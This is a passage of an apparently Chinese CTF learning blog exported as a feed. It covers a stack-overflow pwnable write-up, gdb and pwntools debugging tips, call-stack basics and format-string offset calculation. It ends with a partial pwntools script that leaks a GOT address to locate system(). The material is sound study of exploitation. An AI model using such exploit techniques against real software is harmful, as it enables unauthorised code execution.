+<p>​        虽然但是，解决方法也比较弱智。把https改成http是最粗暴的解决方案了，但是有一说一，这不优雅。但是最后还是妥协了，先用http下了一个ntp，然而发现就算是系统时间校准了，换回https后还是现实证书不被信任。。。</p>
+<p>​        这里留个疑点吧。</p>
+<p>​        还是回到题目本身。也就是无法<code>gdb.attach()</code>的问题。</p>
+<p>​        原来是因为要先输入tmux进入，才能执行分屏。。。。。。。。</p>
+<p>​        我傻了。坑是真的多。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%885.30.51.png" data-caption="截屏2021-11-04 下午5.30.51" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%885.30.51.png" alt="截屏2021-11-04 下午5.30.51"></a></p>
+<p>​        果然碰到了无限waiting for debug的问题，虽然pwntools是4.6.1了。</p>
+<p>​        在修改源码后解决问题，详情可以参考：<a href="https://blog.csdn.net/weixin_43483799/article/details/118885208?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link">pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案</a>。</p>
+<p>​        解决问题的过程中又发现了一个问题，就是我打开tmux的时候突然就风扇狂转，CPU占用率直接飙到109%，内存3.53G。我以为是容器开太多的问题，把多余的容器全部rm，但是还是不见缓解。</p>
+<p>​        百度后发现这个好像是MAC运行Docker的通病，但是我这个容器至少不应该是这样，因为之前风扇一直就没怎么转，于是我把我现在运行的容器停止，结果cpu占用率一下就变低了，然后再重启，cpu占用率再也没有升高。</p>
+<p>​        对于这个情况我的合理猜测是，那个pwntools源码的无限循环问题。</p>
+<h3 id=""><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png" data-caption="" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png" alt=""></a><a class="post-anchor" href="#"></a></h3><p>​    </p>
 <p>​    </p>
+<p>​        尝试了一下一种新的下断点方式。    </p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.43.49.png" data-caption="截屏2021-11-04 下午7.43.49" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.43.49.png" alt="截屏2021-11-04 下午7.43.49"></a></p>
+<p>​        回到题目，很显然如果摁执行shellcode，就根本没有反应（（</p>
+<p>​        eip也没有被覆盖。之前的猜测是栈空间不够，这里来验证一下。</p>
+<p>​        新问题，如果调试的话terminal中tmux的选项似乎只能指定splitw，但是这样就没有办法滚动。。。</p>
+<p>​        好，解决了。首先可以通过按ctrl+b后再按[，切换到查看另一个窗口的历史输出模式，然后将终端中的偏好设置里的“滚动备用屏幕”取消勾选（其实默认应该是不勾的）</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.42.37.png" data-caption="截屏2021-11-04 下午9.42.37" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.42.37.png" alt="截屏2021-11-04 下午9.42.37"></a></p>
+<p>​        这样我们的操作逻辑就是Fn/shift加鼠标滚轮滚动页面，普通的鼠标滚轮则选择历史输入，然后</p>
+<p>ctrl+b后再按[，可以用鼠标滚轮控制光标查看历史输出。</p>
+<p>​        (真有够麻烦的)</p>
+<h3 id="3）漏洞利用">3）漏洞利用<a class="post-anchor" href="#3）漏洞利用"></a></h3><p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.50.04.png" data-caption="截屏2021-11-04 下午9.50.04" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.50.04.png" alt="截屏2021-11-04 下午9.50.04"></a>        </p>
+<p>​        看一下发现不对头，这个返回地址是我们的shellcode。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211104215119020.png" data-caption="image-20211104215119020" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211104215119020.png" alt="image-20211104215119020"></a></p>
+<p>​        按照我的想法，指令应该继续执行下去的，因为堆栈可执行。但是实际上并没有执行，而是把shellcode识别成了返回地址。</p>
+<p>​        然后我才意识到一直以来我对栈溢出其实是有一些理解上的错误的，retn这个操作码无论如何是不能够被覆盖的，覆盖的只有后面的操作数。所以这里我们需要让程序先retn到一个合法的地址，然后后面跟着shellcode。</p>
+<p>​        那么我们要retn到哪里呢？</p>
+<p>​        既然堆栈可执行，那就直接跳到栈上好了。所以此刻我们需要一个栈上的地址。</p>
+<p>​        既然需要泄露内存，肯定就需要有类似功能的函数，非常清明地，我们能够利用<code>sys_write</code></p>
+<p>对栈上内存进行一个读取。</p>
+<p>​        那么如何利用捏。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.00.26.png" data-caption="截屏2021-11-04 下午10.00.26" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.00.26.png" alt="截屏2021-11-04 下午10.00.26"></a>            </p>
+<p>​        从这里我们可以清楚地看到，这几条指令分别设置了<code>sys_write</code>的参数，真正的参数实际上是字符串“lets start the ctf”，但是我们这里只需要这四条指令。</p>
+<p>​        <code> mov  ecx, esp</code>将当前栈顶的值赋给ecx，作为函数输出的东西的参数。其他的参数这里我们不必关心。</p>
+<p>​        </p>
+<p>![截屏2021-11-04 下午10.13.28](/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.13.28.png)        </p>
+<p>​        其实从第一个执行流的ret开始前，清栈已经完成，此时栈顶是下一条需要执行的指令的地址，后面就都是栈上的一些环境变量。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.11.55.png" data-caption="截屏2021-11-04 下午10.11.55" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.11.55.png" alt="截屏2021-11-04 下午10.11.55"></a></p>
+<p>​        当我们的程序执行流回到0x8048087。被write出来的其实就是栈顶的地址。</p>
+<p>​        这时候程序还是会按照原有的指令执行，比如说下一个<code>sys_read</code>函数。</p>
+<p>​        这时候并没有任何栈指针的操作，以至于esp的值很久没有变过。但是这里没有必要在意，直接第二次栈溢出。这里我们retn的地方就是刚刚获得的栈地址。但是因为我们已经输入了0x20个字符，所以需要stack_addr+20。（从动调中我们能够看出，<code>sys_read</code>会对栈指针进行操作，也就是把输入的每一个A压栈，这样我们原先的地址需要+20）</p>
+<p>​        然后直接溢出到栈地址。</p>
+<p>​        执行shellcode</p>
+<p>![截屏2021-11-04 下午10.23.18](/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.23.43.png)</p>
+<p>​            hhx</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.24.07.png" data-caption="截屏2021-11-04 下午10.24.07" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.24.07.png" alt="截屏2021-11-04 下午10.24.07"></a></p>
+<h3 id="4）总结">4）总结<a class="post-anchor" href="#4）总结"></a></h3><p>​        这道题以前做过。但是那个时候我还是个啥也不懂只会抄wp的傻子。那个时候基本问啥啥不懂，现在已经能完全通过exp将不理解的地方通过动调明确了。</p>
+<p>​        动调真的只用了不到半个小时，今天有五分之四的时间都在调教pwndocker的环境。用pwndocker来做真的非常优雅而且方便，我以后真的要舍弃pd力！！！！</p>
+<p>​        另外容器要记得及时备份55.</p>
+<p>​        还有就是经常出现挂载文件夹不同步的问题，这个应该是docker本身存在一些bug，重启以后基本能够解决。</p>
+<p>​        </p>
 </body></html>]]></content>
       <tags>
         <tag>pwnable</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>gdb附加调试的一些黑魔法</title>
+    <url>/2021/10/27/gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/</url>
+    <content><![CDATA[<html><head></head><body><h2 id="1）abstract">1）abstract<a class="post-anchor" href="#1）abstract"></a></h2><p>​    这个part主要综合了一些奇怪的调试中遇到的问题，不定期更新。</p>
+<h2 id="2）格式化字符串-cctf-pwn3">2）格式化字符串-cctf-pwn3<a class="post-anchor" href="#2）格式化字符串-cctf-pwn3"></a></h2><h3 id="1）pause（p）导致ERROR-Could-not-find-ELF-base">1）pause（p）导致ERROR: Could not find ELF base<a class="post-anchor" href="#1）pause（p）导致ERROR-Could-not-find-ELF-base"></a></h3><h5 id="问题">问题<a class="post-anchor" href="#问题"></a></h5><p>​    在开始动调这个exp的时候，发现一个很奇怪的点就是如果下的断点的模式gdb.attach(sh)，那么程序会异常退出，大概是这样：</p>
+<pre><code class="bash">Attaching to program: /home/rin/pwn/ctf-wiki/format/cctf-pwn3/pwn3, process 27837
+Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so...done.
+ERROR: Could not find ELF base!
+done.
+Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.27.so...done.
+done.
+Cannot access memory at address 0xf7fad924
+
+warning: Unable to find dynamic linker breakpoint function.
+GDB will be unable to debug shared library initializers
+and track explicitly loaded dynamic code.
+Failed to read a valid object file image from memory.
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+0xf7f85b59 in ?? ()
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+ERROR: Could not find ELF base!
+
+</code></pre>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%8811.17.59.png" data-caption="截屏2021-10-27 上午11.17.59" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%8811.17.59.png" alt="截屏2021-10-27 上午11.17.59"></a></p>
+<p>​    首先需要知道这个报错的原因。</p>
+<p>​    虽然我并没有查到<code>ERROR: Could not find ELF base!</code>这个报错发生的直接trigger，但是很显然这个报错发生是因为程序进程中止，因此无法找到elf base。</p>
+<p>​    那么进程中止的原因何在？</p>
+<h5 id="解决方案">解决方案<a class="post-anchor" href="#解决方案"></a></h5><p>​     经过大师指点，这个问题其实是因为exp错误（</p>
+<p>​    这里的问题是在断点之后，我引用了未经定义的payload，导致程序异常退出，然后这个退出反映在gdb中则是<code>elf base not found</code>。    </p>
+<h5 id="总结">总结<a class="post-anchor" href="#总结"></a></h5><p>​    如果exp正确，这个报错其实并不会存在。可以反推，如果再次碰到类似的报错，十有八九是exp的问题，而并不能把一切锅推给环境。</p>
+<h2 id="3）-kernel-vsyscall？">3）__kernel_vsyscall？<a class="post-anchor" href="#3）-kernel-vsyscall？"></a></h2><h5 id="问题-1">问题<a class="post-anchor" href="#问题-1"></a></h5><p>​    上一个问题中提到，如果我们只是输入gdb.attach()，那么程序会断在<code>__kernel_vsyscall</code>这个函数上。遇见这个函数也是不止一次了，但是从未想过要了解它，今天我决定一探究竟。</p>
+<p>​    我们期望我们的进程暂停在puts payload之前，实际上确实，在此之前，exp没几乎没有任何与远端的io交互，所以断在奇怪的地方也可以理解，那么<code>__kernel_vsyscall</code>是一个怎样的函数，为什么偏偏就断在它的身上呢？ </p>
+<h5 id="解决">解决<a class="post-anchor" href="#解决"></a></h5><p>​    在stackoverflow上，我们能够看出一些端倪。</p>
+<blockquote>
+<p>​    <code>__kernel_vsyscal</code> is the method used by linux-gate.so (a part of the Linux kernel) to make a system call using the fastest available method, preferably the <code>sysenter</code> instruction. </p>
+</blockquote>
+<p>​    这其实就是个系统调用方法，回想一下在srop中的知识点，其实每个系统调用都是一个中断，然后系统切换至内核态进行工作，完成后再切换回用户态，并将结果返回至用户态。</p>
+<p>​    所以出现   <code>__kernel_vsyscal</code> 意味着此刻程序正在进行系统调用。我们同时可以注意到，当  <code>__kernel_vsyscal</code> 函数执行完成，下一个函数则是<code>read</code>函数，也符合我们程序的逻辑–一个菜单题，exp中任何一条语句的结束都将使得函数执行流回到main函数，等待我们的指令。</p>
+<p>当然要结束这个函数我们只需要gdb finish。</p>
+<p>或者直接使用gdb.attach(sh,”break xxx”)。</p>
+<p>关于系统调用我想又可以写一篇专门的博客来研究，这里就不费笔墨了，详情可见：</p>
+<h2 id="4）gdb附加调试下断点的几种姿势。">4）gdb附加调试下断点的几种姿势。<a class="post-anchor" href="#4）gdb附加调试下断点的几种姿势。"></a></h2><h5 id="1）gdb-attach-p">1）gdb.attach(p)<a class="post-anchor" href="#1）gdb-attach-p"></a></h5><h5 id="2）gdb-attach-p-”break-lt-func-name-gt-”">2）gdb.attach(p,”break &lt;func name&gt;”)<a class="post-anchor" href="#2）gdb-attach-p-”break-lt-func-name-gt-”"></a></h5><h5 id="3）p-gdb-debug-“elf”-”break-lt-func-name-gt-”">3）p = gdb.debug(“elf”,”break &lt;func name&gt;” )<a class="post-anchor" href="#3）p-gdb-debug-“elf”-”break-lt-func-name-gt-”"></a></h5><h2 id="5）p-gdb-debug-“elf”-”break-lt-func-name-gt-”">5）p = gdb.debug(“elf”,”break &lt;func name&gt;” )<a class="post-anchor" href="#5）p-gdb-debug-“elf”-”break-lt-func-name-gt-”"></a></h2><p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png" data-caption="截屏2021-11-04 下午7.35.02" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png" alt="截屏2021-11-04 下午7.35.02"></a></p>
+<p>​    </p>
+<h2 id="6）Linux-Signal">6）Linux Signal<a class="post-anchor" href="#6）Linux-Signal"></a></h2><p>​            在调试萌新赛题目的时候总是按ctrl+c试图终给程序一个断点，然后就报错。如图</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%882.46.31.png" data-caption="截屏2021-11-05 下午2.46.31" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%882.46.31.png" alt="截屏2021-11-05 下午2.46.31"></a></p>
+<p>​        感觉也不是段错误，反正类似。感觉有必要系统地了解一下linux的信号机制。</p>
+<p>​        在CSAPP Chapter8 Section5中，我们能看到对于linux signal的详细解释。</p>
+<p>​        signal算是对程序的一种软中断。一般我们能接收到的有关信号处理都是发生在程序异常的时候。然后这里sigint就是当我们按下ctrl+c，内核就给进程发送一个sigint信号，使进程中断。</p>
+<p>​        csapp上一个表非常清晰地描述了一些信号的作用以及对应的默认行为。</p>
+<p>​        <a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%883.33.06.png" data-caption="截屏2021-11-05 下午3.33.06" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%883.33.06.png" alt="截屏2021-11-05 下午3.33.06"></a></p>
+<p>​            实际的信号不止这三十种。更加具体的可以看关于linux异常控制流的笔记。</p>
+<h2 id="）参考">）参考<a class="post-anchor" href="#）参考"></a></h2><p><a href="https://blog.csdn.net/fjh1997/article/details/105434992">如何做到一边使用pwntools一边使用gdb下断点到main函数前</a></p>
+</body></html>]]></content>
+      <tags>
+        <tag>gdb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SROP学习</title>
+    <url>/2021/11/07/srop%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[]]></content>
+      <tags>
+        <tag>stack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>简单的函数调用栈基础</title>
+    <url>/2021/10/12/%E5%86%8D%E6%8E%A2%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
+    <content><![CDATA[<html><head></head><body><h3 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h3><p>stack_pro力求从最底层的角度深究每一道简单的栈溢出题背后的原理。而第一章则从栈溢出的理论基础–函数调用栈开始。</p>
+<h3 id="2）函数调用栈">2）函数调用栈<a class="post-anchor" href="#2）函数调用栈"></a></h3><p>从一个简单的程序入手。</p>
+<p>程序来自你邮萌新赛pwn1-人类补习计划。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211012194601557.png" data-caption="image-20211012194601557" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211012194601557.png" alt="image-20211012194601557"></a></p>
+<p>​    可以看到对栈空间进行一个初始化的操作的三行关键代码。</p>
+<pre><code class="asm">push    rbp
+mov     rbp, rsp
+sub     rsp, 30h
+</code></pre>
+<p>然后就是人神共愤的函数调用栈环节。</p>
+<blockquote>
+<p>rbp ： 栈基址指针寄存器 。</p>
+<p>rsp ： 栈顶指针寄存器。</p>
+</blockquote>
+<p>​    之前也提到，栈是一种先进后出的数据结构，所以肯定有一端是固定的，然后另一端用来操作。这里rbp就对应固定的栈底（高地址），rsp对应一直在变化的栈顶（低地址）。</p>
+<p>​    并且因为rbp通常是固定的，所以函数的一些局部变量的索引的基址就是rbp。</p>
+<p>​    值得一提的是，以静态调试的角度来看一个程序的二进制文件，内存地址都是由低地址向高地址增长的，所以在ida中，stack的结构大致如下。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-12%20%E4%B8%8B%E5%8D%8811.11.18.png" data-caption="截屏2021-10-12 下午11.11.18" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-12%20%E4%B8%8B%E5%8D%8811.11.18.png" alt="截屏2021-10-12 下午11.11.18"></a></p>
+<p>​     ebp也就是s的位置，很显然在esp之下。</p>
+<p>​     然而实际上，在内存空间中，栈上的数据是由高地址向低地址增长。也就是地址越小，实际离ebp越远。</p>
+<blockquote>
+<p>主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p>
+</blockquote>
+<p>这段话说得非常玄学，而csapp中说得就非常简单清晰</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%888.01.32.png" data-caption="截屏2021-10-13 下午8.01.32" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%888.01.32.png" alt="截屏2021-10-13 下午8.01.32"></a></p>
+<blockquote>
+<p>当前正在执行的过程的帧总是在栈 顶。当过程P调用过程Q时，会把返回地址压人栈中，指明当Q返回时，要从P程序的哪 个位置继续执行。我们把这个返回地址当做P的栈帧的一部分，因为它存放的是与P相关 的状态。Q的代码会扩展当前栈的边界，分配它的栈帧所需的空间。在这个空间中，它可 以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。</p>
+</blockquote>
+<p>​    还有一点就是，之前也没有很正确地理解何为局部变量。虽然众所周知的知识点是说，局部变量是函数内部定义的变量，离开这个函数就无法被引用，然而我总是没有将局部变量与buf 联系起来，实际上buf，这个缓冲区，就是被调函数的局部变量。</p>
+<p>​    那么直接从动态调试的角度来研究函数调用栈。</p>
+<p>​    关于压栈的一些传参方式，可以参见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析</a>，这里主要讨论传参以后，有关返回地址以及栈顶栈指针变化的一些操作，以及一些奇怪的初始化相关函数的运行姿势。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%885.14.08.png" data-caption="截屏2021-10-13 下午5.14.08" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%885.14.08.png" alt="截屏2021-10-13 下午5.14.08"></a></p>
+<p>当执行完push rbp以及 sub rsp ，0x30以后，栈空间为0x30。</p>
+<p>此时可以注意到整个栈上存的指针都非常奇怪，也就是libc中的一些初始化函数的指令。</p>
+<p>可以联系一下ret2csu中的知识点，也就是main函数执行前_libc_start_main执行点一系列初始化操作。</p>
+<p>tbc</p>
+</body></html>]]></content>
+      <tags>
+        <tag>asm Primary</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析</title>
+    <url>/2021/10/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/</url>
+    <content><![CDATA[<html><head></head><body><p>重点研究如何计算32/64位程序中格式化字符串在栈上的偏移，以及研究自动化求偏移的实现</p>
+<h3 id="1）32位偏移计算原理">1）32位偏移计算原理<a class="post-anchor" href="#1）32位偏移计算原理"></a></h3><p>​    其实这个计算确实是有手就行，只需要在栈上找到对应的格式化字符串，然后数是第几个，再减去返回地址所占的一个位置，就是偏移量。</p>
+<p>​    准确来说应该是格式化字符串在栈上的偏移。</p>
+<p>​    原理也比较简单。x86架构下，格式化字符串时通过栈传递的。</p>
+<p>​    然后联想一下函数调用栈的知识点，格式化字符串本身和printf的参数一样，从右到左依次被压栈。</p>
+<p>​    举一个例子，源码来源于<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html">3.1.1 格式化字符串漏洞</a></p>
+<pre><code class="c">//test1.c
+#include&lt;stdio.h&gt;
+void main() {
+    printf("%s %d %s", "Hello World!", 233, "\n");
+}
+</code></pre>
+<p>​    这个程序没有任何的漏洞，只是因为非常简单直观，拿来研究printf函数参数的传参。</p>
+<p>​    我们以32位编译。</p>
+<pre><code class="bash">gcc -m32 test1.c -o test1
+</code></pre>
+<p>​    在main函数处下一个断点。然后执行到断点处。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png" data-caption="截屏2021-10-28 下午11.35.36" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png" alt="截屏2021-10-28 下午11.35.36"></a></p>
+<p>​    随便多单步几次，可以看到push指令，此刻主调函数已经开始向栈中压入参数了，从<code>stack</code></p>
+<p>部分我们可以看到，此时栈里已经有一个参数”\n”。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png" data-caption="截屏2021-10-28 下午11.38.15" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png" alt="截屏2021-10-28 下午11.38.15"></a>    </p>
+<p>​    继续单步，观察栈的变化，此时栈顶已经扩大了很多，printf的所有需要的参数都在栈中。然后我们需要调用printf函数。</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png" data-caption="截屏2021-10-28 下午11.40.00" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png" alt="截屏2021-10-28 下午11.40.00"></a></p>
+<p>​    可以看到，这条指令call printf，我们刚刚压栈的参数此时被printf使用。执行完后的下一条指令使esp加0x10，栈空间缩小，回到最初的样子：</p>
+<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png" data-caption="截屏2021-10-28 下午11.41.43" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png" alt="截屏2021-10-28 下午11.41.43"></a></p>
+<p>​    然后回忆一下被调函数参数和局部变量压栈的过程：</p>
+<p>​    主调函数将被调函数参数从右到左压入栈中，随后将返回地址压栈，此时，栈上的参数偏移的计算就非常清晰了。</p>
+<p>​    这里可能有些弯需要理解一下。大致就是刚刚说到的，主调函数首先将printf需要的函数从右到左依次压栈，（正好栈是从高地址向低地址增长的，所以在gdb stack中呈现的顺序是正常理解的从左到右的先后次序），当将printf需要的参数全部存到栈中后，即可调用printf使用这些参数，此时的栈帧尚属于主调函数，在这个程序中我们不考虑返回地址，所以当参数全部入栈，printf即被调用，栈顶也指向格式化字符串所在的地址。在这里，格式化字符串就是栈上的第一个参数，偏移量就是1。当printf调用完毕，参数即出栈，也就不存在什么格式化字符串偏移了。    </p>
+<h3 id="2）64位偏移计算原理">2）64位偏移计算原理<a class="post-anchor" href="#2）64位偏移计算原理"></a></h3><p>​        原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。</p>
+<h3 id="3）-pwntools-fmtstr工具">3） pwntools_fmtstr工具<a class="post-anchor" href="#3）-pwntools-fmtstr工具"></a></h3><p>​    在前面的分析中我们可以看到，其实找到格式化字符串的偏移量是一件非常简单的事情，都1202年了，既然是简单的步骤，我们应该需要学会运用自动化工具，使做题步骤简化，比如偏移量的寻找，以及与格式化字符串利用相关的一些事。</p>
+<p>​    pwntools就非常人性化地为我们集成了格式化字符串偏移量寻找，got表覆盖等非常常见好用的操作，这里我们通过简单的例子，着重讨论这些自动化脚本编写的原理。</p>
+<h5 id="例子">例子<a class="post-anchor" href="#例子"></a></h5><p>​    例如，这是一段自动化的格式化字符串漏洞利用的脚本，主要适用于rop并改got表的板子题。</p>
+<pre><code class="python">from pwn import *
+
+elf = ELF('./')
+r = process('./')
+libc = ELF('/')
+
+# 计算偏移量
+def exec_fmt(payload):
+    r.sendline(payload)
+    info = r.recv()
+    return info
+  
+auto = FmtStr(exec_fmt)
+offset = auto.offset
+
+# 获得 func 的 got 地址
+func_got = elf.got['func']#func通常是一些例如printf或puts的函数
+log.success("func_got =&gt; {}".format(hex(func_got)))
+
+# 获得 func 的真实地址
+payload = p32(func_got) + '%{}$s'.format(offset)
+r.send(payload)
+func_addr = u32(r.recv()[4:8])
+log.success("func_addr =&gt; {}".format(hex(func_addr)))
+
+# 获得 system 的真实地址
+system_addr = func_addr - (libc.symbols['func'] - libc.symbols['system'])
